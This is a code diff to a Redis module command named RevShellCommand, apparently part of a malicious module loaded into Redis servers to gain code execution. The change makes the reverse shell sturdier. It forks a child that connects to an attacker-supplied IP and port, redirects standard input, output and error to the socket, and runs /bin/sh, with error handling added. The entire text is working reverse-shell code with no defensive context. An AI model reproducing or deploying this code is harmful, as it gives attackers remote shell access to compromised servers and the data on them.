@@ -42,19 +42,34 @@ int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
 		char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
 		int port = atoi(port_s);
 		int s;
+                int pid;
+                pid = fork();
+                if (pid == 0) {
+                  // I am the child
+                  struct sockaddr_in sa;
+                  sa.sin_family = AF_INET;
+                  sa.sin_addr.s_addr = inet_addr(ip);
+                  sa.sin_port = htons(port);
 
-		struct sockaddr_in sa;
-		sa.sin_family = AF_INET;
-		sa.sin_addr.s_addr = inet_addr(ip);
-		sa.sin_port = htons(port);
-		
-		s = socket(AF_INET, SOCK_STREAM, 0);
-		connect(s, (struct sockaddr *)&sa, sizeof(sa));
-		dup2(s, 0);
-		dup2(s, 1);
-		dup2(s, 2);
+                  int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                  if (sock == -1) {
+                    perror("Socket creation failed.\n");
+                    exit(EXIT_FAILURE);
+                  }
+                  // Connect socket
+                  if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == -1) {
+                    perror("Socket connection failed.\n");
+                    close(sock);
+                    exit(EXIT_FAILURE);
+                  }
 
-		execve("/bin/sh", 0, 0);
+                  dup2(sock, 0);
+                  dup2(sock, 1);
+                  dup2(sock, 2);
+                  
+                  execve("/bin/sh", NULL, NULL);
+                }
+                
         } else {
                 return RedisModule_WrongArity(ctx);
         }
